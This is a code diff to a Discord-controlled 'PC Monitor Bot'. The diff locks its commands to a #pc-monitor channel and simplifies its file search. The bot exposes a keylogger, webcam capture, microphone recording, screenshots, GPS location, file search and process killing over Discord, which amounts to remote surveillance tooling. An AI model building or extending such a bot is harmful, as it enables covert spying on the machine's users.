@@ -1035,6 +1035,12 @@ async def search_files_async(query: str, path: str, mode: str = 'name_glob', con
                             name_match = bool(re.search(query, filename))
                         except Exception:
                             continue
+                    elif mode == 'name_partial':
+                        # Partial matching - case insensitive substring search
+                        try:
+                            name_match = query.lower() in filename.lower()
+                        except Exception:
+                            continue
                     
                     if name_match:
                         file_path = Path(root) / filename
@@ -1043,27 +1049,15 @@ async def search_files_async(query: str, path: str, mode: str = 'name_glob', con
                             file_size = stat_info.st_size
                             mod_time = datetime.fromtimestamp(stat_info.st_mtime).strftime('%Y-%m-%d %H:%M')
                             
-                            # Content filtering for small files
-                            content_match = True
-                            if content and file_size <= 10 * 1024 * 1024:  # Only scan files <= 10MB
-                                try:
-                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                        file_content = f.read().lower()
-                                        content_match = content.lower() in file_content
-                                except Exception:
-                                    content_match = False
-                            elif content and file_size > 10 * 1024 * 1024:
-                                content_match = False  # Skip large files for content search
+                            # Add matched file to results (no content filtering)
+                            results.append({
+                                'path': str(file_path),
+                                'size': file_size,
+                                'modified': mod_time
+                            })
                             
-                            if content_match:
-                                results.append({
-                                    'path': str(file_path),
-                                    'size': file_size,
-                                    'modified': mod_time
-                                })
-                                
-                                if len(results) >= limit:
-                                    return {'results': results, 'partial': False}
+                            if len(results) >= limit:
+                                return {'results': results, 'partial': False}
                         except Exception:
                             continue
             
@@ -1212,6 +1206,10 @@ def is_authorized_user(user_id: int, guild_owner_id: int) -> bool:
         return str(user_id) in allowed_ids
     
     return False
+
+def is_pc_monitor_channel(interaction: discord.Interaction) -> bool:
+    """Check if the command is being used in the pc-monitor channel."""
+    return interaction.channel.name == 'pc-monitor'
 
 async def terminate_process_async(pid: int = None, name: str = None, signal_type: str = 'TERM', 
                                 force: bool = False):
@@ -1442,6 +1440,10 @@ async def on_message(message):
 
 @bot.tree.command(name='help', description='Show all available commands')
 async def help_command(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     help_text = """
 **PC Monitor Bot Commands**
 /ss - Take a screenshot
@@ -1466,6 +1468,10 @@ async def help_command(interaction: discord.Interaction):
 
 @bot.tree.command(name='ss', description='Take a screenshot of the current screen')
 async def screenshot(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer()
         screenshot_path = take_screenshot()
@@ -1482,6 +1488,10 @@ async def screenshot(interaction: discord.Interaction):
 
 @bot.tree.command(name='mic', description='Record 10 seconds of audio from the microphone')
 async def record(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer()
         audio_path = record_audio()
@@ -1503,6 +1513,10 @@ async def record(interaction: discord.Interaction):
 ])
 async def media_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
     """Simple and reliable media control using pyautogui media keys."""
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         success, message = control_media(action.value)
         
@@ -1518,6 +1532,10 @@ async def media_control(interaction: discord.Interaction, action: discord.app_co
 @bot.tree.command(name='volume', description='Set system volume')
 @discord.app_commands.describe(level='Volume level (0-100)')
 async def volume(interaction: discord.Interaction, level: int):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     success, result = set_volume(level)
     if success:
         await interaction.response.send_message(f"🔊 Volume set to {result}%")
@@ -1533,6 +1551,10 @@ async def volume(interaction: discord.Interaction, level: int):
 ])
 async def power_control(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
     """Control system power state with confirmation and warnings."""
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         # Add warning for destructive actions
         if action.value in ['shutdown', 'restart']:
@@ -1590,6 +1612,10 @@ async def power_control(interaction: discord.Interaction, action: discord.app_co
 ])
 async def toggle_keylogger(interaction: discord.Interaction, action: discord.app_commands.Choice[str]):
     global keylogger_active, keylogger_listener, keylogger_channel, last_send_time
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         if action.value == 'start':
             if not keylogger_active:
@@ -1623,6 +1649,10 @@ async def toggle_keylogger(interaction: discord.Interaction, action: discord.app
 
 @bot.tree.command(name='sysinfo', description='Show comprehensive system information (location, battery, CPU, RAM, etc.)')
 async def system_info(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer()  # This might take a few seconds due to network requests
         info = get_system_info()
@@ -1636,6 +1666,10 @@ async def system_info(interaction: discord.Interaction):
 
 @bot.tree.command(name='ip', description='Show the system IP address')
 async def ip_address(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         ip = get_ip_address()
         await interaction.response.send_message(f"🌐 IP Address: {ip}")
@@ -1646,6 +1680,10 @@ async def ip_address(interaction: discord.Interaction):
 @bot.tree.command(name='locate', description='Get precise location with GPS coordinates and timestamp')
 async def locate(interaction: discord.Interaction):
     """Get current location using macOS Location Services (GPS-only)."""
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer()  # This may take time for location services
         
@@ -1723,6 +1761,10 @@ async def locate(interaction: discord.Interaction):
 
 @bot.tree.command(name='uptime', description='Show system uptime')
 async def uptime(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         uptime_str = get_uptime()
         await interaction.response.send_message(f"⏱️ Uptime: {uptime_str}")
@@ -1737,6 +1779,10 @@ async def uptime(interaction: discord.Interaction):
     discord.app_commands.Choice(name='CPU Usage', value='cpu')
 ])
 async def processes(interaction: discord.Interaction, sort_by: discord.app_commands.Choice[str]):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         processes = get_top_processes(sort_by=sort_by.value, limit=15)
         
@@ -1762,6 +1808,10 @@ async def processes(interaction: discord.Interaction, sort_by: discord.app_comma
 
 @bot.tree.command(name='camera', description='Take a photo using the webcam')
 async def camera(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer()
         photo_path = take_webcam_photo()
@@ -1779,6 +1829,10 @@ async def camera(interaction: discord.Interaction):
 
 @bot.tree.command(name='all', description='Run all monitoring commands')
 async def execute_all(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer()
         results = []
@@ -1822,29 +1876,25 @@ async def execute_all(interaction: discord.Interaction):
         else:
             await interaction.followup.send(f"Error executing all functions: {str(e)}")
 
-@bot.tree.command(name='find', description='Search files by name/regex, optional content filter')
+@bot.tree.command(name='find', description='Search files by filename with partial matching')
 @discord.app_commands.describe(
-    query='Search pattern (supports *.log, report_*.pdf for glob mode or regex patterns)',
+    query='Search pattern - filename or partial filename to search for',
     path='Directory to search in (defaults to home directory)', 
-    mode='Search mode for filename matching',
-    content='Case-insensitive substring to search within files (≤10MB)',
     limit='Maximum number of files to return',
     depth='Maximum directory depth to search',
-    include_hidden='Include hidden files and directories'
+    include_hidden='Include hidden files and directories (default: True)'
 )
-@discord.app_commands.choices(mode=[
-    discord.app_commands.Choice(name='Glob Pattern (*.txt, file_*.log)', value='name_glob'),
-    discord.app_commands.Choice(name='Regex Pattern (^report_\\d+\\.pdf$)', value='name_regex')
-])
-async def find_files(interaction: discord.Interaction, query: str, path: str = None, 
-                    mode: discord.app_commands.Choice[str] = None, content: str = None,
-                    limit: int = 100, depth: int = 6, include_hidden: bool = False):
+async def find_files(interaction: discord.Interaction, query: str, path: str = None,
+                    limit: int = 100, depth: int = 6, include_hidden: bool = True):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer(thinking=True)
         
         # Set defaults
         search_path = path if path else FIND_DEFAULT_PATH
-        search_mode = mode.value if mode else 'name_glob'
         
         # Validate parameters
         if limit > 2000:
@@ -1856,8 +1906,8 @@ async def find_files(interaction: discord.Interaction, query: str, path: str = N
         result = await search_files_async(
             query=query,
             path=search_path, 
-            mode=search_mode,
-            content=content,
+            mode='name_partial',
+            content=None,
             limit=limit,
             depth=depth,
             include_hidden=include_hidden
@@ -1882,10 +1932,7 @@ async def find_files(interaction: discord.Interaction, query: str, path: str = N
         preview_text = f"🔍 **Found {len(files)} file{'s' if len(files) != 1 else ''}**"
         if partial:
             preview_text += f" ({message})"
-        preview_text += f"\n**Search**: `{query}` in `{search_path}`\n"
-        if content:
-            preview_text += f"**Content filter**: `{content}`\n"
-        preview_text += "\n"
+        preview_text += f"\n**Search**: `{query}` in `{search_path}`\n\n"
         
         for i, file_info in enumerate(files[:10]):
             size_mb = file_info['size'] / (1024 * 1024)
@@ -1949,6 +1996,10 @@ async def find_files(interaction: discord.Interaction, query: str, path: str = N
 async def find_process(interaction: discord.Interaction, name: str = None, pid: int = None,
                       mode: discord.app_commands.Choice[str] = None, limit: int = 15,
                       sort_by: discord.app_commands.Choice[str] = None):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     try:
         await interaction.response.defer(thinking=True)
         
@@ -2032,7 +2083,7 @@ async def find_process(interaction: discord.Interaction, name: str = None, pid: 
             if not interaction.response.is_done():
                 await interaction.response.send_message(f"❌ Error searching processes: {str(e)}")
             else:
-                await interaction.followup.send(f"❌ Error searching processes: {str(e)}", ephemeral=True)
+                await interaction.followup.send(f"❌ Error searching processes: {str(e)}")
         except Exception:
             pass
 
@@ -2051,6 +2102,11 @@ async def find_process(interaction: discord.Interaction, name: str = None, pid: 
 async def kill_process(interaction: discord.Interaction, pid: int = None, name: str = None,
                       signal: discord.app_commands.Choice[str] = None, force: bool = False):
     try:
+        # Check if command is used in pc-monitor channel
+        if not is_pc_monitor_channel(interaction):
+            await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+            return
+        
         # Authorization check
         guild_owner_id = interaction.guild.owner_id if interaction.guild else interaction.user.id
         if not is_authorized_user(interaction.user.id, guild_owner_id):
@@ -2080,24 +2136,28 @@ async def kill_process(interaction: discord.Interaction, pid: int = None, name: 
         )
         
         if 'error' in result:
-            await interaction.followup.send(f"❌ {result['error']}", ephemeral=True)
+            await interaction.followup.send(f"❌ {result['error']}")
         elif 'success' in result:
-            await interaction.followup.send(f"✅ {result['success']}", ephemeral=True)
+            await interaction.followup.send(f"✅ {result['success']}")
         else:
-            await interaction.followup.send("❌ Unknown error occurred during termination.", ephemeral=True)
+            await interaction.followup.send("❌ Unknown error occurred during termination.")
         
     except Exception as e:
         logger.error(f"Error in kill command: {str(e)}")
         try:
             if not interaction.response.is_done():
-                await interaction.response.send_message(f"❌ Error terminating process: {str(e)}", ephemeral=True)
+                await interaction.response.send_message(f"❌ Error terminating process: {str(e)}")
             else:
-                await interaction.followup.send(f"❌ Error terminating process: {str(e)}", ephemeral=True)
+                await interaction.followup.send(f"❌ Error terminating process: {str(e)}")
         except Exception:
             pass
 
 @bot.tree.command(name='debug', description='Test all system functions')
 async def debug(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
     await interaction.response.defer()
     results = []
     # ss test
